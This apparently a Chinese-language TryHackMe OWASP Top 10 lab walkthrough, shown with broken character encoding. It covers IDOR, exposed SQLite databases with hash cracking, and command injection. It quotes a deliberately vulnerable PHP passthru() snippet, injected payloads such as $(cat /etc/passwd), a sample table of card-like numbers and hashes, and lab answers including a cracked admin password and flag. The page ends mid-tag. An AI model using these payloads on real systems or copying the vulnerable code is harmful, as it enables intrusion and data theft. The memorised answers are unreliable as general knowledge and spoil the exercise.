æˆ–ä¸å®‰å…¨ç›´æ¥å¯¹è±¡å¼•ç”¨æ˜¯æŒ‡è®¿é—®æ§åˆ¶æ¼æ´ï¼Œæ‚¨å¯ä»¥é€šè¿‡è¯¥æ¼æ´è®¿é—®é€šå¸¸çœ‹ä¸åˆ°çš„èµ„æºã€‚å½“ç¨‹åºå‘˜å…¬å¼€ç›´æ¥å¯¹è±¡å¼•ç”¨æ—¶ï¼Œå°±ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µï¼Œè¯¥å¼•ç”¨åªæ˜¯å¼•ç”¨æœåŠ¡å™¨å†…ç‰¹å®šå¯¹è±¡çš„æ ‡è¯†ç¬¦ã€‚å°±å¯¹è±¡è€Œè¨€ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‡æ–‡ä»¶ã€ç”¨æˆ·ã€é“¶è¡Œåº”ç”¨ç¨‹åºä¸­çš„é“¶è¡Œå¸æˆ·æˆ–ä»»ä½•å…¶ä»–ä¸œè¥¿ã€‚</p><p>å‡è®¾æˆ‘ä»¬æ­£åœ¨ç™»å½•æˆ‘ä»¬çš„é“¶è¡Œå¸æˆ·ï¼Œå¹¶åœ¨æ­£ç¡®éªŒè¯è‡ªå·±èº«ä»½åï¼Œæˆ‘ä»¬ä¼šçœ‹åˆ°è¿™æ ·çš„ URLÂ <code>https://bank.thm/account?id=111111</code>Â ã€‚åœ¨è¯¥é¡µé¢ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ‰€æœ‰é‡è¦çš„é“¶è¡Œè¯¦ç»†ä¿¡æ¯ï¼Œç”¨æˆ·ä¼šåšä»»ä½•ä»–ä»¬éœ€è¦åšçš„äº‹æƒ…å¹¶ç»§ç»­å‰è¿›ï¼Œè®¤ä¸ºæ²¡æœ‰ä»»ä½•é—®é¢˜ã€‚<br><img src="/PenTest_FILE/97f8a530d314117566bfd1e7b060072e_MD5.jpeg"></p><p>ç„¶è€Œï¼Œè¿™é‡Œå­˜åœ¨ä¸€ä¸ªæ½œåœ¨çš„å·¨å¤§é—®é¢˜ï¼Œä»»ä½•äººéƒ½å¯ä»¥å°†Â <code>id</code>Â å‚æ•°æ›´æ”¹ä¸ºÂ <code>222222</code>Â ä¹‹ç±»çš„å…¶ä»–å‚æ•°ï¼Œå¦‚æœç«™ç‚¹é…ç½®ä¸æ­£ç¡®ï¼Œé‚£ä¹ˆä»–å°±ä¼šè®¿é—®ä»–äººçš„é“¶è¡Œä¿¡æ¯ã€‚<br><img src="/PenTest_FILE/Pasted%20image%2020240308203059.png"></p><h2 id="ç»ƒä¹ "><a href="#ç»ƒä¹ " class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h2><p>ç•¥</p><h1 id="äºŒã€åŠ å¯†æ•…éšœ"><a href="#äºŒã€åŠ å¯†æ•…éšœ" class="headerlink" title="äºŒã€åŠ å¯†æ•…éšœ"></a>äºŒã€åŠ å¯†æ•…éšœ</h1><p>åŠ å¯†æ•…éšœæ˜¯æŒ‡å› æ»¥ç”¨ï¼ˆæˆ–ç¼ºä¹ä½¿ç”¨ï¼‰ä¿æŠ¤æ•æ„Ÿä¿¡æ¯çš„åŠ å¯†ç®—æ³•è€Œäº§ç”Ÿçš„ä»»ä½•æ¼æ´ã€‚ Web åº”ç”¨ç¨‹åºéœ€è¦åŠ å¯†æŠ€æœ¯æ¥ä¸ºå…¶ç”¨æˆ·æä¾›å¤šä¸ªçº§åˆ«çš„æœºå¯†æ€§ã€‚</p><p>ä»¥å®‰å…¨ç”µå­é‚®ä»¶åº”ç”¨ç¨‹åºä¸ºä¾‹ï¼š</p><ul><li>å½“æ‚¨ä½¿ç”¨æµè§ˆå™¨è®¿é—®ç”µå­é‚®ä»¶å¸æˆ·æ—¶ï¼Œæ‚¨éœ€è¦ç¡®ä¿æ‚¨ä¸æœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡å·²åŠ å¯†ã€‚è¿™æ ·ï¼Œä»»ä½•è¯•å›¾æ•è·æ‚¨çš„ç½‘ç»œæ•°æ®åŒ…çš„çªƒå¬è€…éƒ½å°†æ— æ³•æ¢å¤æ‚¨çš„ç”µå­é‚®ä»¶åœ°å€çš„å†…å®¹ã€‚å½“æˆ‘ä»¬åŠ å¯†å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„ç½‘ç»œæµé‡æ—¶ï¼Œæˆ‘ä»¬é€šå¸¸å°†å…¶ç§°ä¸ºåŠ å¯†ä¼ è¾“ä¸­çš„æ•°æ®ã€‚</li><li>ç”±äºæ‚¨çš„ç”µå­é‚®ä»¶å­˜å‚¨åœ¨ç”±æ‚¨çš„æä¾›å•†ç®¡ç†çš„æŸäº›æœåŠ¡å™¨ä¸­ï¼Œå› æ­¤ç”µå­é‚®ä»¶æä¾›å•†ä¹Ÿå¸Œæœ›æ— æ³•è¯»å–å…¶å®¢æˆ·çš„ç”µå­é‚®ä»¶ã€‚ä¸ºæ­¤ï¼Œæ‚¨çš„ç”µå­é‚®ä»¶åœ¨å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸Šæ—¶ä¹Ÿå¯èƒ½ä¼šè¢«åŠ å¯†ã€‚è¿™ç§°ä¸ºé™æ€æ•°æ®åŠ å¯†ã€‚</li></ul><p>åŠ å¯†å¤±è´¥çš„åæœï¼Ÿ</p><ul><li>åŠ å¯†å¤±è´¥é€šå¸¸ä¼šå¯¼è‡´ç½‘ç»œåº”ç”¨ç¨‹åºæ„å¤–æ³„éœ²æ•æ„Ÿæ•°æ®ã€‚è¿™é€šå¸¸æ˜¯ä¸å®¢æˆ·ç›´æ¥ç›¸å…³çš„æ•°æ®ï¼ˆä¾‹å¦‚å§“åã€å‡ºç”Ÿæ—¥æœŸã€è´¢åŠ¡ä¿¡æ¯ï¼‰ï¼Œä½†ä¹Ÿå¯èƒ½æ˜¯æ›´å¤šæŠ€æœ¯ä¿¡æ¯ï¼Œä¾‹å¦‚ç”¨æˆ·åå’Œå¯†ç ã€‚</li><li>åœ¨æ›´å¤æ‚çš„å±‚é¢ä¸Šï¼Œåˆ©ç”¨æŸäº›åŠ å¯†å¤±è´¥é€šå¸¸æ¶‰åŠè¯¸å¦‚â€œä¸­é—´äººæ”»å‡»â€ä¹‹ç±»çš„æŠ€æœ¯ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è¿™ç§æŠ€æœ¯å¼ºåˆ¶ç”¨æˆ·é€šè¿‡ä»–ä»¬æ§åˆ¶çš„è®¾å¤‡è¿›è¡Œè¿æ¥ã€‚ç„¶åï¼Œä»–ä»¬å°†åˆ©ç”¨å¯¹ä»»ä½•ä¼ è¾“æ•°æ®çš„å¼±åŠ å¯†æ¥è®¿é—®æˆªè·çš„ä¿¡æ¯ï¼ˆå¦‚æœæ•°æ®ä¸€å¼€å§‹å°±è¢«åŠ å¯†ï¼‰ã€‚å½“ç„¶ï¼Œè®¸å¤šç¤ºä¾‹è¦ç®€å•å¾—å¤šï¼Œå¹¶ä¸”å¯ä»¥åœ¨ Web åº”ç”¨ç¨‹åºä¸­æ‰¾åˆ°æ¼æ´ï¼Œæ— éœ€é«˜çº§ç½‘ç»œçŸ¥è¯†å³å¯åˆ©ç”¨è¿™äº›æ¼æ´ã€‚äº‹å®ä¸Šï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ•æ„Ÿæ•°æ®å¯ä»¥ç›´æ¥åœ¨ç½‘ç»œæœåŠ¡å™¨æœ¬èº«ä¸Šæ‰¾åˆ°ã€‚</li></ul><h2 id="ææ–™1"><a href="#ææ–™1" class="headerlink" title="ææ–™1"></a>ææ–™1</h2><p>å¯ä»å¤šä¸ªä½ç½®è½»æ¾è®¿é—®çš„æ ¼å¼å­˜å‚¨å¤§é‡æ•°æ®çš„æœ€å¸¸è§æ–¹æ³•æ˜¯åœ¨æ•°æ®åº“ä¸­ã€‚è¿™å¯¹äº Web åº”ç”¨ç¨‹åºä¹‹ç±»çš„ä¸œè¥¿æ¥è¯´æ˜¯å®Œç¾çš„ï¼Œå› ä¸ºè®¸å¤šç”¨æˆ·å¯ä»¥éšæ—¶ä¸ç½‘ç«™äº¤äº’ã€‚æ•°æ®åº“å¼•æ“é€šå¸¸éµå¾ªç»“æ„åŒ–æŸ¥è¯¢è¯­è¨€ï¼ˆSQLï¼‰è¯­æ³•ã€‚</p><p>åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œé€šå¸¸ä¼šçœ‹åˆ°æ•°æ®åº“è®¾ç½®åœ¨è¿è¡Œ MySQL æˆ– MariaDB ç­‰æ•°æ®åº“æœåŠ¡çš„ä¸“ç”¨æœåŠ¡å™¨ä¸Šï¼›ä½†æ˜¯ï¼Œæ•°æ®åº“ä¹Ÿå¯ä»¥å­˜å‚¨ä¸ºæ–‡ä»¶ã€‚è¿™äº›è¢«ç§°ä¸ºâ€œ<code>flat-file</code>â€æ•°æ®åº“ï¼Œå› ä¸ºå®ƒä»¬ä½œä¸ºå•ä¸ªæ–‡ä»¶å­˜å‚¨åœ¨è®¡ç®—æœºä¸Šã€‚è¿™æ¯”è®¾ç½®æ•´ä¸ªæ•°æ®åº“æœåŠ¡å™¨è¦å®¹æ˜“å¾—å¤šï¼Œå¹¶ä¸”å¯èƒ½ä¼šåœ¨è¾ƒå°çš„ Web åº”ç”¨ç¨‹åºä¸­çœ‹åˆ°ã€‚è®¿é—®æ•°æ®åº“æœåŠ¡å™¨è¶…å‡ºäº†ä»Šå¤©ä»»åŠ¡çš„èŒƒå›´ï¼Œå› æ­¤è®©æˆ‘ä»¬å…³æ³¨å¹³é¢æ–‡ä»¶æ•°æ®åº“ã€‚</p><p>å¦‚å‰æ‰€è¿°ï¼Œå¹³é¢æ–‡ä»¶æ•°æ®åº“ä½œä¸ºæ–‡ä»¶å­˜å‚¨åœ¨è®¡ç®—æœºç£ç›˜ä¸Šã€‚é€šå¸¸ï¼Œè¿™å¯¹äºç½‘ç»œåº”ç”¨ç¨‹åºæ¥è¯´ä¸æ˜¯é—®é¢˜ï¼Œä½†å¦‚æœæ•°æ®åº“å­˜å‚¨åœ¨ç½‘ç«™çš„æ ¹ç›®å½•ä¸‹ï¼ˆå³è¿æ¥åˆ°ç½‘ç«™çš„ç”¨æˆ·å¯ä»¥è®¿é—®çš„æ–‡ä»¶ä¹‹ä¸€ï¼‰ï¼Œä¼šå‘ç”Ÿä»€ä¹ˆæƒ…å†µï¼Ÿå¥½å§ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è‡ªå·±çš„æœºå™¨ä¸Šä¸‹è½½å’ŒæŸ¥è¯¢å®ƒï¼Œå¹¶ä¸”å¯ä»¥å®Œå…¨è®¿é—®æ•°æ®åº“ä¸­çš„æ‰€æœ‰å†…å®¹ã€‚ç¡®å®æ˜¯æ•æ„Ÿæ•°æ®æ³„éœ²ï¼</p><hr><p>ç°åœ¨è®©æˆ‘ä»¬ç®€è¦ä»‹ç»ä¸€ä¸‹ç”¨äºæŸ¥è¯¢å¹³é¢æ–‡ä»¶æ•°æ®åº“çš„ä¸€äº›è¯­æ³•ï¼š</p><p>å¹³é¢æ–‡ä»¶æ•°æ®åº“æœ€å¸¸è§ï¼ˆä¹Ÿæ˜¯æœ€ç®€å•ï¼‰çš„æ ¼å¼æ˜¯ SQLite æ•°æ®åº“ã€‚è¿™äº›å¯ä»¥åœ¨å¤§å¤šæ•°ç¼–ç¨‹è¯­è¨€ä¸­è¿›è¡Œäº¤äº’ï¼Œå¹¶ä¸”æœ‰ä¸€ä¸ªä¸“ç”¨çš„å®¢æˆ·ç«¯ç”¨äºåœ¨å‘½ä»¤è¡Œä¸ŠæŸ¥è¯¢å®ƒä»¬ã€‚è¯¥å®¢æˆ·ç«¯ç§°ä¸ºÂ <code>sqlite3</code>Â ï¼Œé»˜è®¤å®‰è£…åœ¨è®¸å¤š Linux å‘è¡Œç‰ˆä¸Šã€‚</p><p>å‡è®¾æˆ‘ä»¬å·²æˆåŠŸä¸‹è½½æ•°æ®åº“ï¼š</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">user@linux$ ls -l -rw-r--r-- 1 user user 8192 Feb  2 20:33 example.dbuser@linux$ file example.db example.db: SQLite 3.x database, last written using SQLite version 3039002, file counter 1, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¦è®¿é—®å®ƒï¼Œæˆ‘ä»¬ä½¿ç”¨Â <code>sqlite3 &lt;database-name&gt;</code>å‘½ä»¤Â ï¼š</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">user@linux$ sqlite3 example.db                     SQLite version 3.39.2 2022-07-21 15:24:47Enter ".help" for usage hints.sqlite> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨Â <code>.tables</code>Â å‘½ä»¤æŸ¥çœ‹æ•°æ®åº“ä¸­çš„è¡¨ï¼š</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">user@linux$ sqlite3 example.db                     SQLite version 3.39.2 2022-07-21 15:24:47Enter ".help" for usage hints.sqlite> .tablescustomers<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥è½¬å‚¨è¡¨ä¸­çš„æ‰€æœ‰æ•°æ®ï¼Œä½†æ˜¯é™¤éæŸ¥çœ‹è¡¨ä¿¡æ¯ï¼Œå¦åˆ™æˆ‘ä»¬ä¸ä¸€å®šçŸ¥é“æ¯ä¸€åˆ—çš„å«ä¹‰ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬ä½¿ç”¨Â <code>PRAGMA table_info(customers);</code>Â æ¥æŸ¥çœ‹è¡¨ä¿¡æ¯ã€‚ç„¶åæˆ‘ä»¬å°†ä½¿ç”¨Â <code>SELECT * FROM customers;</code>Â ä»è¡¨ä¸­è½¬å‚¨æ•°æ®ï¼š</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">sqlite> PRAGMA table_info(customers);0|cudtID|INT|1||11|custName|TEXT|1||02|creditCard|TEXT|0||03|password|TEXT|1||0sqlite> SELECT * FROM customers;0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf991|John Walters|4671 5376 3366 8125|fef08f333cc53594c8097eba1f35726a2|Lena Abdul|4353 4722 6349 6685|b55ab2470f160c331a99b8d8a1946b193|Andrew Miller|4059 8824 0198 5596|bc7b657bd56e4386e3397ca86e378f704|Keith Wayman|4972 1604 3381 8885|12e7a36c0710571b3d827992f4cfe6795|Annett Scholz|5400 1617 6508 1166|e2795fc96af3f4d6288906a90a52a47f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ææ–™2"><a href="#ææ–™2" class="headerlink" title="ææ–™2"></a>ææ–™2</h2><p>åœ¨å“ˆå¸Œç ´è§£æ–¹é¢ï¼ŒKali é¢„è£…äº†å„ç§å·¥å…·ã€‚å¦‚æœæ‚¨çŸ¥é“å¦‚ä½•ä½¿ç”¨è¿™äº›ï¼Œè¯·éšæ„ä½¿ç”¨ï¼›ç„¶è€Œï¼Œå®ƒä»¬è¶…å‡ºäº†æœ¬ææ–™çš„èŒƒå›´ã€‚</p><p>ç›¸åï¼Œæˆ‘ä»¬å°†ä½¿ç”¨åœ¨çº¿å·¥å…·ï¼š<a href="https://crackstation.net/">CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.</a>ï¼Œè¿›è¡Œå½©è™¹è¡¨ç¢°æ’</p><h2 id="ç»ƒä¹ -1"><a href="#ç»ƒä¹ -1" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h2><p>æµè§ˆä¸€ä¸‹ç½‘ç»œåº”ç”¨ç¨‹åºã€‚å¼€å‘äººå‘˜ç»™è‡ªå·±ç•™ä¸‹äº†ä¸€æ¡æ³¨é‡Šï¼Œè¡¨æ˜ç‰¹å®šç›®å½•ä¸­æœ‰æ•æ„Ÿæ•°æ®ã€‚</p><ul><li>ä¸Šè¿°ç›®å½•çš„åç§°æ˜¯ä»€ä¹ˆï¼Ÿç­”ï¼š<br>é¦–é¡µæ²¡æœ‰ä»€ä¹ˆé—®é¢˜<br><img src="/PenTest_FILE/fa24095329b4d7b35762a42a51446691_MD5.jpeg"><br>åœ¨loginçœ‹åˆ°äº†æ³¨é‡Š assets<br><img src="/PenTest_FILE/a6979d552ab0aba1a1598ed86cbdaa6e_MD5.jpeg"></li></ul><p><img src="/PenTest_FILE/0ef27edd8e8b031ff089bd212b836ef8_MD5.jpeg"></p><p>ä¸‹è½½webapp.db<br><img src="/PenTest_FILE/ef4b0b0e27099daa051888c28929ebf2_MD5.jpeg"><br>å½©è™¹è¡¨æ‰“ä¸€ä¸‹ï¼Œå¯†ç qwertyuiop<br><img src="/PenTest_FILE/e74e0a1744696b32a4f04617ca3a825e_MD5.jpeg"></p><p><img src="/PenTest_FILE/f2d9cdd3125fba348d4a5f93f0b749cf_MD5.jpeg"></p><ul><li>å¯¼èˆªåˆ°æ‚¨åœ¨é—®é¢˜ä¸€ä¸­æ‰¾åˆ°çš„ç›®å½•ã€‚å“ªäº›æ–‡ä»¶å¯èƒ½åŒ…å«æ•æ„Ÿæ•°æ®ï¼Ÿï¼šwebapp.db</li><li>ä½¿ç”¨æ”¯æŒææ–™è®¿é—®æ•æ„Ÿæ•°æ®ã€‚ç®¡ç†å‘˜ç”¨æˆ·çš„å¯†ç å“ˆå¸Œæ˜¯ä»€ä¹ˆï¼Ÿç­”ï¼š6eea9b7ef19179a06954edd0f6c05ceb</li><li>ç®¡ç†å‘˜çš„æ˜æ–‡å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿç­”ï¼šqwertyuiop</li><li>ä»¥ç®¡ç†å‘˜èº«ä»½ç™»å½•ã€‚æ——å¸œæ˜¯ä»€ä¹ˆï¼Ÿç­”ï¼šTHM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}</li></ul><h1 id="ä¸‰ã€æ³¨å…¥"><a href="#ä¸‰ã€æ³¨å…¥" class="headerlink" title="ä¸‰ã€æ³¨å…¥"></a>ä¸‰ã€æ³¨å…¥</h1><h2 id="å‘½ä»¤æ³¨å…¥"><a href="#å‘½ä»¤æ³¨å…¥" class="headerlink" title="å‘½ä»¤æ³¨å…¥"></a>å‘½ä»¤æ³¨å…¥</h2><p>è®©æˆ‘ä»¬è€ƒè™‘ä¸€ä¸ªåœºæ™¯ï¼šMooCorp å·²å¼€å§‹å¼€å‘ä¸€ä¸ªåŸºäº Web çš„åº”ç”¨ç¨‹åºï¼Œç”¨äºå…·æœ‰å¯è‡ªå®šä¹‰æ–‡æœ¬çš„å¥¶ç‰› ASCII è‰ºæœ¯ã€‚åœ¨å¯»æ‰¾å®ç°åº”ç”¨ç¨‹åºçš„æ–¹æ³•æ—¶ï¼Œä»–ä»¬ä½¿ç”¨ Linux ä¸­çš„Â <code>cowsay</code>Â å‘½ä»¤ã€‚ä»–ä»¬å†³å®šç¼–å†™ä¸€äº›ç®€å•çš„ä»£ç ï¼Œä»æ“ä½œç³»ç»Ÿçš„æ§åˆ¶å°è°ƒç”¨owsayå‘½ä»¤å¹¶å°†å…¶å†…å®¹å‘é€å›ç½‘ç«™ï¼Œè€Œä¸æ˜¯ç¼–å†™æ•´ä¸ªWebåº”ç”¨ç¨‹åºæ¥å®ç°è‰ºæœ¯å­—çš„é€»è¾‘ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"mooing"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$mooing</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"mooing"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$cow</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'default'</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"cow"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token variable">$cow</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"cow"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token function">passthru</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"perl /usr/bin/cowsay -f <span class="token interpolation"><span class="token variable">$cow</span></span> <span class="token interpolation"><span class="token variable">$mooing</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/PenTest_FILE/ce81de0e88486be6a6bd78efc5bd1fe1_MD5.jpeg"></p><p>ç°åœ¨æˆ‘ä»¬çŸ¥é“äº†åº”ç”¨ç¨‹åºå¦‚ä½•åœ¨å¹•åå·¥ä½œï¼Œæˆ‘ä»¬å°†åˆ©ç”¨ç§°ä¸ºâ€œå†…è”å‘½ä»¤â€çš„ bash åŠŸèƒ½æ¥æ»¥ç”¨owsayæœåŠ¡å™¨å¹¶æ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„ä»»ä½•ä»»æ„å‘½ä»¤ã€‚</p><p>è¦æ‰§è¡Œå†…è”å‘½ä»¤ï¼Œåªéœ€æŒ‰ä»¥ä¸‹æ ¼å¼å°†å®ƒä»¬æ‹¬èµ·æ¥Â <code>$(your_command_here)</code>Â ï¼š<strong>å¦‚æœæ§åˆ¶å°æ£€æµ‹åˆ°å†…è”å‘½ä»¤ï¼Œå®ƒä¼šå…ˆæ‰§è¡Œå®ƒï¼Œç„¶åå°†ç»“æœä½œä¸ºå¤–éƒ¨å‘½ä»¤çš„å‚æ•°</strong>ã€‚è¯·çœ‹ä»¥ä¸‹ç¤ºä¾‹ï¼Œè¯¥ç¤ºä¾‹å°†Â <code>whoami</code>Â ä½œä¸ºÂ <code>echo</code>Â å‘½ä»¤å†…çš„å†…è”å‘½ä»¤è¿è¡Œï¼š<br><img src="/PenTest_FILE/b16d18b7699611da0a4c93b6a0f2e76c_MD5.jpeg"></p><p>å›åˆ°cowsayæœåŠ¡å™¨ï¼Œå¦‚æœæˆ‘ä»¬å‘webåº”ç”¨ç¨‹åºå‘é€å†…è”å‘½ä»¤ï¼Œå°†ä¼šå‘ç”Ÿå¦‚ä¸‹æƒ…å†µï¼š<br><img src="/PenTest_FILE/6ed0ab0e8426c7a5dd18820555a8b37f_MD5.jpeg"></p><h2 id="ç»ƒä¹ -2"><a href="#ç»ƒä¹ -2" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h2><ul><li><p>ç½‘ç«™æ ¹ç›®å½•ä¸‹æœ‰ä»€ä¹ˆå¥‡æ€ªçš„æ–‡æœ¬æ–‡ä»¶ï¼Ÿç­”ï¼šdrpepper.txt</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable"><span class="token variable">$(</span><span class="token function">ls</span><span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>æœ‰å¤šå°‘ä¸ªé root&#x2F;éæœåŠ¡&#x2F;éå®ˆæŠ¤ç¨‹åºç”¨æˆ·ï¼Ÿç­”ï¼š0</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> /etc/passwd<span class="token variable">)</span></span> _________________________________________ / root:x:0:0:root:/root:/bin/ash          <span class="token punctuation">\</span><span class="token operator">|</span> bin:x:1:1:bin:/bin:/sbin/nologin        <span class="token operator">|</span><span class="token operator">|</span> daemon:x:2:2:daemon:/sbin:/sbin/nologin <span class="token operator">|</span><span class="token operator">|</span> adm:x:3:4:adm:/var/adm:/sbin/nologin    <span class="token operator">|</span><span class="token operator">|</span> lp:x:4:7:lp:/var/spool/lpd:/sbin/nologi <span class="token operator">|</span><span class="token operator">|</span> n sync:x:5:0:sync:/sbin:/bin/sync       <span class="token operator">|</span><span class="token operator">|</span> shutdown:x:6:0:shutdown:/sbin:/sbin/shu <span class="token operator">|</span><span class="token operator">|</span> tdown halt:x:7:0:halt:/sbin:/sbin/halt  <span class="token operator">|</span><span class="token operator">|</span> mail:x:8:12:mail:/var/mail:/sbin/nologi <span class="token operator">|</span><span class="token operator">|</span> n                                       <span class="token operator">|</span><span class="token operator">|</span> news:x:9:13:news:/usr/lib/news:/sbin/no <span class="token operator">|</span><span class="token operator">|</span> login                                   <span class="token operator">|</span><span class="token operator">|</span> uucp:x:10:14:uucp:/var/spool/uucppublic <span class="token operator">|</span><span class="token operator">|</span> :/sbin/nologin                          <span class="token operator">|</span><span class="token operator">|</span> operator:x:11:0:operator:/root:/sbin/no <span class="token operator">|</span><span class="token operator">|</span> login                                   <span class="token operator">|</span><span class="token operator">|</span> man:x:13:15:man:/usr/man:/sbin/nologin  <span class="token operator">|</span><span class="token operator">|</span> postmaster:x:14:12:postmaster:/var/mail <span class="token operator">|</span><span class="token operator">|</span> :/sbin/nologin                          <span class="token operator">|</span><span class="token operator">|</span> cron:x:16:16:cron:/var/spool/cron:/sbin <span class="token operator">|</span><span class="token operator">|</span> /nologin                                <span class="token operator">|</span><span class="token operator">|</span> ftp:x:21:21::/var/lib/ftp:/sbin/nologin <span class="token operator">|</span><span class="token operator">|</span> sshd:x:22:22:sshd:/dev/null:/sbin/nolog <span class="token operator">|</span><span class="token operator">|</span> <span class="token keyword">in</span>                                      <span class="token operator">|</span><span class="token operator">|</span> at:x:25:25:at:/var/spool/cron/atjobs:/s <span class="token operator">|</span><span class="token operator">|</span> bin/nologin                             <span class="token operator">|</span><span class="token operator">|</span> squid:x:31:31:Squid:/var/cache/squid:/s <span class="token operator">|</span><span class="token operator">|</span> bin/nologin xfs:x:33:33:X Font          <span class="token operator">|</span><span class="token operator">|</span> Server:/etc/X11/fs:/sbin/nologin        <span class="token operator">|</span><span class="token operator">|</span> games:x:35:35:games:/usr/games:/sbin/no <span class="token operator">|</span><span class="token operator">|</span> login                                   <span class="token operator">|</span><span class="token operator">|</span> cyrus:x:85:12::/usr/cyrus:/sbin/nologin <span class="token operator">|</span><span class="token operator">|</span> vpopmail:x:89:89::/var/vpopmail:/sbin/n <span class="token operator">|</span><span class="token operator">|</span> ologin                                  <span class="token operator">|</span><span class="token operator">|</span> ntp:x:123:123:NTP:/var/empty:/sbin/nolo <span class="token operator">|</span><span class="token operator">|</span> gin                                     <span class="token operator">|</span><span class="token operator">|</span> smmsp:x:209:209:smmsp:/var/spool/mqueue <span class="token operator">|</span><span class="token operator">|</span> :/sbin/nologin                          <span class="token operator">|</span><span class="token operator">|</span> guest:x:405:100:guest:/dev/null:/sbin/n <span class="token operator">|</span><span class="token operator">|</span> ologin                                  <span class="token operator">|</span><span class="token operator">|</span> nobody:x:65534:65534:nobody:/:/sbin/nol <span class="token operator">|</span><span class="token operator">|</span> ogin                                    <span class="token operator">|</span><span class="token operator">|</span> apache:x:100:101:apache:/var/www:/sbin/ <span class="token operator">|</span><span class="token punctuation">\</span> nologin                                 / -----------------------------------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>è¯¥åº”ç”¨ç¨‹åºä»¥ä»€ä¹ˆç”¨æˆ·èº«ä»½è¿è¡Œï¼Ÿç­”ï¼šapache</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable"><span class="token variable">$(</span><span class="token function">whoami</span><span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>ç”¨æˆ·çš„shellè®¾ç½®ä¸ºä»€ä¹ˆï¼Ÿç­”ï¼š&#x2F;sbin&#x2F;nologin</p></li><li><p>æ­£åœ¨è¿è¡Œä»€ä¹ˆç‰ˆæœ¬çš„ Alpine Linuxï¼Ÿç­”ï¼š3.16.0<br>ç™¾åº¦ä¸€ä¸‹</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> /etc/alpine-release<span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h1 id="å››ã€ä¸å®‰å…¨çš„è®¾è®¡"><a href="#å››ã€ä¸å®‰å…¨çš„è®¾è®¡" class="headerlink" title="å››ã€ä¸å®‰å…¨çš„è®¾è®¡"></a>å››ã€ä¸å®‰å…¨çš„è®¾è®¡</h1><h2 id="ä¸å®‰å…¨çš„å¯†ç è®¾ç½®"><a 